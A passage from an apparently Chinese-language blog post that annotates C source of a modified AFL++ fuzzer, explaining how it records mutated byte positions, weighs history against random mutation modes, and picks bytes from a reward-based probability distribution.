class="hljs-keyword">if</span>(afl-&gt;history_mode &amp;&amp; afl-&gt;queue_cur-&gt;ancestor_seed &amp;&amp; afl-&gt;from_splicing == <span class="hljs-number">0</span> &amp;&amp; afl-&gt;queue_cur-&gt;vec_update_time)&#123;<br>  generate_mutation_sequence(afl);<span class="hljs-comment">// 生成变异序列</span><br>  <span class="hljs-keyword">if</span>(afl-&gt;history_mutation_sequence_idx)&#123;<span class="hljs-comment">// 如果有变异字节出现</span><br>    history_able = <span class="hljs-number">1</span>;<span class="hljs-comment">// histroy模式标志位</span><br>    history_mini_pos = temp_len;<span class="hljs-comment">// temp_len为afl-&gt;cur_queue-&gt;len</span><br>    <span class="hljs-keyword">for</span>(u32 e = <span class="hljs-number">0</span>;e &lt; afl-&gt;history_mutation_sequence_idx;e++)&#123;<span class="hljs-comment">// 遍历变异序列</span><br>      <span class="hljs-keyword">if</span>(history_mini_pos &gt; afl-&gt;history_mutation_sequence[e]) history_mini_pos = afl-&gt;history_mutation_sequence[e];<span class="hljs-comment">// 找到一个位置最小的变异字节</span><br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(afl-&gt;distribution) <span class="hljs-built_in">free</span>(afl-&gt;distribution);<span class="hljs-comment">// 如果已经有分布，那么清空。</span><br>  afl-&gt;distribution = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>) * afl-&gt;history_mutation_sequence_idx);<span class="hljs-comment">//分配空间</span><br>  <span class="hljs-built_in">memset</span>(afl-&gt;distribution, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>) * afl-&gt;history_mutation_sequence_idx);<span class="hljs-comment">// 初始化为0</span><br>  afl-&gt;distribution_sum = <span class="hljs-number">0</span>;<span class="hljs-comment">// 置0</span><br>  afl-&gt;distribution_analyzed = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是<code>generate_mutation_sequence(afl);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">generate_mutation_sequence</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl)</span>&#123;<br>  afl-&gt;history_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;queue_cur-&gt;len;i++)&#123;<br>    u64 ii = (afl-&gt;queue_cur-&gt;<span class="hljs-built_in">map</span>)[i];<span class="hljs-comment">// 在add_to_queue中将q-&gt;map[i]=i &#123;0..len&#125;</span><br>    <span class="hljs-keyword">if</span>(ii &gt; <span class="hljs-number">1000000</span> || ii &gt;= afl-&gt;queue_cur-&gt;ancestor_seed-&gt;len)&#123;<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125; <br>    <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].flag &gt;= <span class="hljs-number">1</span>)&#123;<br>      afl-&gt;history_mutation_sequence[afl-&gt;history_mutation_sequence_idx] = i;<span class="hljs-comment">// 这个记录的就是哪些位置的字节发生了变异</span><br>      afl-&gt;history_mutation_sequence_idx++;<span class="hljs-comment">//记录着发生变异的数量</span><br>    &#125;<br>  &#125;<br>&#125;<span class="hljs-comment">// 本次执行afl-&gt;history_mutation_sequence_idx为217，意味着这个种子有217个字节位置发生了变异。它们的位置都被记录在afl-&gt;history_mutation_sequence数组中。</span><br></code></pre></td></tr></table></figure><p>接下来进入对同一个测试实例的变异次数循环体，由于之前history_able被设置为1了，因此执行以下代码段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(history_able == <span class="hljs-number">1</span> &amp;&amp; new_able == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-comment">// 计算两个权重值</span><br>    weight_history = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_history / afl-&gt;queue_cur-&gt;exec_history;<br>    weight_random = <span class="hljs-number">1.0</span> * afl-&gt;queue_cur-&gt;found_by_random / afl-&gt;queue_cur-&gt;exec_random;<br><span class="hljs-comment">// 计算平均值</span><br>    <span class="hljs-type">double</span> average = <span class="hljs-number">1.0</span> * afl-&gt;found_all / afl-&gt;exec_all;<br>    <span class="hljs-keyword">if</span>(weight_history &lt; average * (<span class="hljs-number">0.7</span> + decrease) &amp;&amp; weight_random &lt; average * (<span class="hljs-number">0.7</span> + decrease))&#123;<br>       <span class="hljs-keyword">break</span>;<br>    &#125; <br><span class="hljs-comment">// </span><br>    history_line = weight_history;<br>    random_line = history_line + weight_random;<br><span class="hljs-comment">// 产生一个随机数</span><br>    <span class="hljs-type">double</span> tmp = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * random_line;<br>    <span class="hljs-keyword">if</span>(tmp &lt; weight_history) history_mode = <span class="hljs-number">1</span>;<span class="hljs-comment">//如果随机数小于weight_history权重值，则进入history_mode，否则进入random_mode模式。</span><br>    <span class="hljs-keyword">else</span> random_mode = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于本次执行时，随机数小于权重值，因此又进入了random_mode，则变异阶段结束后的<code>stat_analysis()</code>函数主体没有执行，执行以下分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span>(afl-&gt;new_edges_found_idx == <span class="hljs-number">0</span> || afl-&gt;queue_cur-&gt;ancestor_seed == <span class="hljs-literal">NULL</span> || afl-&gt;use_splice_mutator || afl-&gt;from_splicing)&#123;<br>   afl-&gt;mini_mode = <span class="hljs-number">0</span>;    <br>   u32 after = count_non_255_bytes(afl, afl-&gt;virgin_bits);<span class="hljs-comment">// 获得afl-&gt;virgin_bits中不是255的字节数量，表示覆盖的边的数量</span><br>   afl-&gt;queue_cur-&gt;found_edges += (after - afl-&gt;before);<span class="hljs-comment">// afl-&gt;before存储的是执行之前的覆盖的边的数量，两个数值相减则得到本次fuzzing所得到的新覆盖的边的数量。</span><br>   afl-&gt;before = after;<span class="hljs-comment">// 调整游标</span><br><span class="hljs-comment">// 如果当前种子splice置1，当前种子发现的新边大于8，并且当前种子的长度大于512</span><br>   <span class="hljs-comment">// 那么重置一些变量</span><br>   <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;splice == <span class="hljs-number">1</span> &amp;&amp; afl-&gt;queue_cur-&gt;found_edges &gt; <span class="hljs-number">8</span> &amp;&amp; afl-&gt;queue_cur-&gt;len &gt; <span class="hljs-number">512</span>)&#123;<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> afl-&gt;queue_cur;<br><br>     u32 map_size = afl-&gt;fsrv.map_size;<br>     q-&gt;virgin_bits = ck_alloc(map_size);<br>     <span class="hljs-built_in">memset</span>(q-&gt;virgin_bits, <span class="hljs-number">255</span>, map_size);<br><br>     q-&gt;reset_times = ck_alloc(map_size);<br>     <span class="hljs-built_in">memset</span>(q-&gt;reset_times, <span class="hljs-number">0</span>, map_size);<br><br>     q-&gt;initial_seed = <span class="hljs-number">1</span>;<br>     q-&gt;ancestor_seed = q;<br>     q-&gt;splice = <span class="hljs-number">0</span>;<br>     q-&gt;incre = <span class="hljs-number">1</span>;<br>     q-&gt;<span class="hljs-built_in">map</span> = (u64 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(u64) * q-&gt;len);<br>     <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; q-&gt;len;i++) (q-&gt;<span class="hljs-built_in">map</span>)[i] = i;<br><br>     q-&gt;mutated_pos = (<span class="hljs-keyword">struct</span> arm *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> arm) * q-&gt;len);<br>     <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; q-&gt;len;i++)&#123;<br>       q-&gt;mutated_pos[i].flag = <span class="hljs-number">0</span>;<br>       q-&gt;mutated_pos[i].A = <span class="hljs-literal">NULL</span>;<br>       q-&gt;mutated_pos[i].b = <span class="hljs-literal">NULL</span>;<br>     &#125;<br>     q-&gt;mutated_pos_num = <span class="hljs-number">0</span>;<br>   &#125;<br>   <span class="hljs-keyword">return</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>接下来的循环，第二次执行就进入了history_mode，置history_mode为1，afl-&gt;record_flag为1。那么进入<code>stat_analysis</code>后，执行函数主体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;record_flag &amp;&amp; afl-&gt;tmp_mutated_pos_idx != <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// record_flag表示执行非random_mode，tmp_mutated_pos_idx表示执行了update()函数，这个函数在进入变异算子的时候会执行。下面有对这个函数的具体解释。</span><br>    <span class="hljs-type">double</span> average_reward;<br>    <span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;n_fuzz_entry != afl-&gt;cur_n_fuzz_idx)&#123; <span class="hljs-comment">// 也就是当前队列种子的覆盖路径与上次执行的路径哈希不一致。即输入种子与变异后的种子覆盖路径不一致。</span><br>      average_reward = (<span class="hljs-number">1</span> - (<span class="hljs-type">double</span>)((<span class="hljs-type">double</span>)afl-&gt;n_fuzz[afl-&gt;cur_n_fuzz_idx] / (<span class="hljs-type">double</span>)afl-&gt;fsrv.total_execs))/(afl-&gt;tmp_mutated_pos_idx * afl-&gt;tmp_mutated_pos_idx);<span class="hljs-comment">// 使用公式计算收益</span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123;<br>      average_reward = <span class="hljs-number">0</span>;<br>    &#125;<br><span class="hljs-comment">// 遍历当前种子所有变异字节</span><br>    <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>; i &lt; afl-&gt;tmp_mutated_pos_idx;i++)&#123;<br>      u32 target_pos = afl-&gt;tmp_mutated_pos[i];<br>      afl-&gt;dataset_reward[target_pos] += average_reward;<span class="hljs-comment">// afl-&gt;dataset_reward存储着各个字节的收益</span><br>      afl-&gt;hit_nums[target_pos]++;<span class="hljs-comment">// 记录着该字节执行分析的次数</span><br>      afl-&gt;dataset_size++;<span class="hljs-comment">// 记录总共分析多少字节，也即dataset_reward的大小</span><br><br>      afl-&gt;tmp_mutated_pos_flag[target_pos] = <span class="hljs-number">0</span>;<span class="hljs-comment">// 复原flag，以便下次执行</span><br>      afl-&gt;tmp_mutated_pos[i] = <span class="hljs-number">0</span>;<span class="hljs-comment">// 复原</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(afl-&gt;tmp_mutated_pos_idx == <span class="hljs-number">0</span>) <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// 没有变异字节，即退出</span><br>    afl-&gt;tmp_mutated_pos_idx = <span class="hljs-number">0</span>;<span class="hljs-comment">// 遍历结束后，置0，便于下次执行判断。</span><br>  &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl, u32 target_pos)</span>&#123;<br>  <span class="hljs-keyword">if</span>(afl-&gt;tmp_mutated_pos_flag[target_pos] == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// 给当前变异种子的位置标志置1</span><br>    afl-&gt;tmp_mutated_pos_flag[target_pos] = <span class="hljs-number">1</span>;<span class="hljs-comment">// </span><br>    afl-&gt;tmp_mutated_pos[afl-&gt;tmp_mutated_pos_idx] = target_pos;<span class="hljs-comment">// 记录变异位置，模拟一个队列</span><br>    afl-&gt;tmp_mutated_pos_idx++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果是Fast调度的话，那么会存在这个n_fuzz数据结构</span><br><span class="hljs-comment">// cksum是当前位图的Hash值</span><br><span class="hljs-comment">// n_fuzz存储着覆盖路径的执行次数</span><br><span class="hljs-keyword">if</span> (afl-&gt;n_fuzz[cksum % N_FUZZ_SIZE] &lt; <span class="hljs-number">0xFFFFFFFF</span>)<br> afl-&gt;n_fuzz[cksum % N_FUZZ_SIZE]++;<br>afl-&gt;cur_n_fuzz_idx = cksum % N_FUZZ_SIZE;<span class="hljs-comment">// 存储最近一次执行的种子的路径hash值，也是n_fuzz的索引</span><br>afl-&gt;queue_top-&gt;n_fuzz_entry = cksum % N_FUZZ_SIZE;<span class="hljs-comment">// n_fuzz_entry是种子的成员变量，因此该种子存储着路径在n_fuzz中的索引</span><br>afl-&gt;n_fuzz[afl-&gt;queue_top-&gt;n_fuzz_entry] = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></blockquote><p>O.o 终于到最后了！！！！根据概率分布选择变异字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c">u32 <span class="hljs-title function_">select_position_based_on_distribution</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl)</span>&#123;<br>  <span class="hljs-keyword">if</span>(afl-&gt;distribution_sum == <span class="hljs-number">0</span> &amp;&amp; afl-&gt;history_mutation_sequence_idx)&#123; <span class="hljs-comment">// distribution_sum为0，说明本次是第一次进行概率分布，afl-&gt;history_mutation_sequence_idx不为0，说明有变异字节</span><br>    afl-&gt;distribution_analyzed++;<span class="hljs-comment">// 记录概率分布分析的次数</span><br><br>    <span class="hljs-type">double</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;history_mutation_sequence_idx;i++)&#123;  <span class="hljs-comment">// 遍历所有变异字节的位置</span><br>      u32 cur_pos = afl-&gt;history_mutation_sequence[i];<span class="hljs-comment">// 将这个位置值赋予cur_pos</span><br><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> * <span class="hljs-title">ancestor_node</span> =</span> afl-&gt;queue_cur-&gt;ancestor_seed;<span class="hljs-comment">// 记录一个初始种子指向当前种子的初始种子</span><br>      u32 ii = (afl-&gt;queue_cur-&gt;<span class="hljs-built_in">map</span>)[cur_pos];<span class="hljs-comment">// ii现在就等于cur_pos</span><br>      <span class="hljs-type">double</span> result;<br>      <span class="hljs-keyword">if</span>(ancestor_node-&gt;mutated_pos[ii].flag &gt;= <span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//如果初始种子的这个字节flag不为0，也就是该字节为必要字节</span><br>        Matrix* feature_vec_copy = Matrix_copy(afl-&gt;queue_cur-&gt;feature_vec);<span class="hljs-comment">// 复制一个特征矩阵，这个矩阵存储着余弦相似值，调用cal_distance函数得出。</span><br>        Matrix* A_copy = Matrix_copy(ancestor_node-&gt;mutated_pos[ii].A);<span class="hljs-comment">// 复制该必要字节的A值</span><br>        Matrix* b_copy = Matrix_copy(ancestor_node-&gt;mutated_pos[ii].b);<span class="hljs-comment">// 复制该必要字节的b值</span><br><br>        Matrix* A_Inverse = M_Inverse(A_copy);<span class="hljs-comment">// A的逆矩阵</span><br>        Matrix* theta = M_mul(A_Inverse,b_copy);<span class="hljs-comment">// A的逆矩阵与b矩阵相乘</span><br>        Matrix* theta_T = M_T(theta);<span class="hljs-comment">// 乘矩阵的转置矩阵</span><br>        Matrix* r1 = M_mul(theta_T,feature_vec_copy);<span class="hljs-comment">// 乘矩阵的转置矩阵与特征向量矩阵相乘</span><br><br>        Matrix* feature_vec_T = M_T(feature_vec_copy);<span class="hljs-comment">// 特征向量矩阵的转置矩阵</span><br>        Matrix* m1 = M_mul(feature_vec_T,A_Inverse);<span class="hljs-comment">// 转置矩阵与A逆矩阵相乘</span><br>        Matrix* m2 = M_mul(m1,feature_vec_copy);<span class="hljs-comment">// 再与特征矩阵相乘</span><br>        <span class="hljs-type">double</span> m3 = <span class="hljs-number">0.5</span> * <span class="hljs-built_in">sqrt</span>(m2-&gt;data[<span class="hljs-number">0</span>]);<span class="hljs-comment">// m3等于0.5倍的根号m2[0]的值</span><br>        result = r1-&gt;data[<span class="hljs-number">0</span>] + m3 + ancestor_node-&gt;mutated_pos[ii].SV;<span class="hljs-comment">// 计算公式。</span><br><br>        <span class="hljs-keyword">if</span>(m2-&gt;data[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span> || isnan(result))&#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;feature_vec_copy\n&quot;</span>);<br>          M_print(feature_vec_copy);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A_copy\n&quot;</span>);<br>          M_print(A_copy);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b_copy\n&quot;</span>);<br>          M_print(b_copy);<br><br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A_Inverse\n&quot;</span>);<br>          M_print(A_Inverse);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;theta\n&quot;</span>);<br>          M_print(theta);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;theta_T\n&quot;</span>);<br>          M_print(theta_T);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;r1\n&quot;</span>);<br>          M_print(r1);<br><br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;feature_vec_T\n&quot;</span>);<br>          M_print(feature_vec_T);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;m1\n&quot;</span>);<br>          M_print(m1);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;m2\n&quot;</span>);<br>          M_print(m2);<br>          <br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;m3:%lf\n&quot;</span>, m3);<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result:%lf\n&quot;</span>, result);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br><br>        M_free(A_Inverse);<br>        M_free(theta);<br>        M_free(theta_T);<br>        M_free(r1);<br>        M_free(feature_vec_T);<br>        M_free(m1);<br>        M_free(m2);<br><br>        M_free(feature_vec_copy);<br>        M_free(A_copy);<br>        M_free(b_copy);<br><br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        result = <span class="hljs-number">0</span>;<br>      &#125;<br><br>      <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>) result = <span class="hljs-number">0.05</span>;<span class="hljs-comment">// 有一个最大下限</span><br>      tmp += result;<span class="hljs-comment">// tmp用于累加所有的result值</span><br>      afl-&gt;distribution[i] = tmp;<span class="hljs-comment">// 每个字节的分布值为当前字节的result</span><br>    &#125;<br>    afl-&gt;distribution_sum = tmp;<span class="hljs-comment">// 将循环结束后的累加值赋予概率分布sum</span><br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(afl-&gt;distribution_sum)&#123;<span class="hljs-comment">// 若分布和不为0的话</span><br>    <span class="hljs-type">double</span> choose = ((<span class="hljs-type">double</span>)rand()/RAND_MAX) * afl-&gt;distribution_sum; <span class="hljs-comment">// 产生一个随机选择临界值choose</span><br>    <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;history_mutation_sequence_idx;i++)&#123;<br>      <span class="hljs-keyword">if</span>(afl-&gt;distribution[i] &gt;= choose)&#123;<span class="hljs-comment">// 选择第一个概率权重值大于等于choose的字节</span><br>        <span class="hljs-keyword">return</span> afl-&gt;history_mutation_sequence[i];<span class="hljs-comment">// 将这个字节返回</span><br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// for(u32 i = 0;i &lt; afl-&gt;history_mutation_sequence_idx;i++)&#123;</span><br>    <span class="hljs-comment">//   printf(&quot;%u:%u -&gt; %f\n&quot;, i, afl-&gt;history_mutation_sequence[i], afl-&gt;distribution[i]);</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-keyword">return</span> afl-&gt;cur_mutation_sequence[rand_below(afl, afl-&gt;cur_mutation_sequence_idx)];<span class="hljs-comment">// 找不到大于choose的字节，则在变异序列中随机返回一个字节</span><br>  &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 分布和为0的话，也随机返回一个字节。</span><br>    <span class="hljs-keyword">return</span> afl-&gt;cur_mutation_sequence[rand_below(afl, afl-&gt;cur_mutation_sequence_idx)];<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>对于A和b的说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 在stat_analysis()中，对A和b的值作初始化</span><br>afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].A = M_I(afl-&gt;centers_num);<br>afl-&gt;queue_cur-&gt;ancestor_seed-&gt;mutated_pos[ii].b = M_Zeros(afl-&gt;centers_num,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure></blockquote><p>最后，执行完分析后还有一段，对data_set的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;dataset_size)&#123; <br>    <span class="hljs-type">float</span> max_reward = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">float</span> min_reward = <span class="hljs-number">999999999999999</span>;<br>    <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queue_cur-&gt;len;i++)&#123;<br>      <span class="hljs-keyword">if</span>(afl-&gt;hit_nums[i])&#123;<span class="hljs-comment">// 记录着变异字节被变异的次数</span><br>        <span class="hljs-keyword">if</span>(afl-&gt;dataset_reward[i]/afl-&gt;hit_nums[i] &gt; max_reward) max_reward = afl-&gt;dataset_reward[i]/afl-&gt;hit_nums[i];<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(afl-&gt;dataset_reward[i]/afl-&gt;hit_nums[i] &lt; min_reward) min_reward = afl-&gt;dataset_reward[i]/afl-&gt;hit_nums[i];<br>      &#125;<span class="hljs-comment">// 获得最大的R和最小的R(收益)</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(max_reward != <span class="hljs-number">0</span> &amp;&amp; min_reward != <span class="hljs-number">999999999999999</span> &amp;&amp; max_reward != min_reward)&#123;<br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queue_cur-&gt;len;i++)&#123;<span class="hljs-comment">// 遍历当前执行的初始种子每个字节</span><br>        <span class="hljs-keyword">if</span>(afl-&gt;hit_nums[i])&#123;<br>          afl-&gt;dataset_reward[i] = (afl-&gt;dataset_reward[i]/afl-&gt;hit_nums[i] - min_reward)/(max_reward - min_reward);<span class="hljs-comment">// 给每个字节的收益进行赋值</span><br>        &#125;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(max_reward != min_reward)&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> * <span class="hljs-title">ancestor_node</span> =</span> afl-&gt;queue_cur-&gt;ancestor_seed;<br>        u32 cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 这个循环是为了计算原始种子每个字节的mutated_pos[].A,mutated_pos[].b</span><br>        <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;queue_cur-&gt;len;i++)&#123;<br>          u32 ii = (afl-&gt;queue_cur-&gt;<span class="hljs-built_in">map</span>)[i];<br>          <span 